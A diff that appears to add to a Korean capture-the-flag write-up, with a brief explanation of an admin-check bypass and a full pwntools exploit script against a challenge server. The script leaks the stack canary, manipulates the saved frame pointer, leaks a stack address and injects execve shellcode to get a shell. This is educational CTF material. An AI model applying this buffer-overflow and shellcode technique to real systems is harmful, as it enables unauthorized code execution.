@@ -440,3 +440,55 @@ LABEL_15:
 
 `admin check`의 조건문을 통과하면 스택을 `RWX`로 만들고, `sub_routine` 함수에서 `bof`를 제공해서 쉘코드로 쉘을 딸 수 있다. 근데 `masterkey`가 `bss`에 저장되어 있기 때문에 주소를 알아서, `main`의 마지막 입력 때 `sfp`를 잘 조작해주면 조건을 만족하게 할 수 있다.
 
+### ex.py
+
+```python
+from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'set follow-fork-mode parent',
+    #'b *0x401828',
+    'b *0x401932',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("chall.polygl0ts.ch", 9036)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+
+master_key = 0x1534ee7faeb1c2aa
+p.sendafter(b') : ', b'a' * 0x29)
+p.recvuntil(b'a' * 0x29)
+canary = u64(b'\x00' + p.recvn(7))
+print(hex(canary))
+p.sendafter(b') : ', b'a')
+p.sendafter(b') : ', b'a' * 0x28 + p64(canary) + p64(0x4040d0 + 0x38) + p64(0x40164d))
+
+shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
+p.sendlineafter(b'3.', b'1')
+p.sendafter(b': ', b'a' * 0x20)
+p.sendlineafter(b'3.', b'2')
+p.recvuntil(b'a' * 0x20)
+stack = u64(p.recvn(6).ljust(8, b'\x00')) - 0x50 + 0x10
+p.sendlineafter(b'3.', b'1')
+p.sendafter(b': ', b'a' * 0x18 + p64(canary) + p64(stack) * 2 + shellcode)
+p.sendlineafter(b'3.', b'3')
+
+p.interactive()
+```
